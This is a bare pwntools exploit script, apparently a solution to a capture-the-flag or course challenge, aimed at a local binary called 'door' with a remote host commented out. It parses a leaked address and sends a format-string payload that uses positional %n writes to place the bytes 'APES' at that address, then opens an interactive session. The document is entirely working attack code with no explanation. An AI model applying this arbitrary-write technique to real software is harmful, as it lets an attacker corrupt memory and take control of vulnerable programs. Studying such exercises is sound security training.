from pwn import *

#p = remote('plsdonthaq.me', 4001)
p = process('./door')

p.recvuntil('the way at ')
target_addr = int(p.recvline().rstrip(), 16)

# full string is APES
ap = u16('AP')
es = u16('ES')

payload = b'AAAAA'
payload += p32(target_addr)
payload += p32(target_addr + 2)

setup_len = len(payload)
lower_2_bytes = ap
upper_2_bytes = es if es>ap else es+(1 << 16) #overflow into next byte

payload += '%3${}x'.format(lower_2_bytes - setup_len).encode()
payload += b'%3$n'
payload += '%4${}x'.format(upper_2_bytes - lower_2_bytes).encode()
payload += b'%4$n'

p.sendline(payload)

p.interactive()
